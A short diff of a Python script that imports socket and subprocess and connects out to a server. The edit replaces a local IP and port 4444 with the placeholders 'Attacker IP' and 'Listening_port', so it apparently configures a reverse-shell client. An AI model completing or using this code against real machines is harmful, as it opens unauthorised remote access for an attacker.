@@ -2,8 +2,8 @@ import socket
 import subprocess
 
 # Set the IP and port of the server you want to connect to
-server_ip = '192.168.1.5'
-server_port = 4444
+server_ip = 'Attacker IP'
+server_port = Listening_port
 
 # Create a socket and connect to the server
 s = socket.socket()
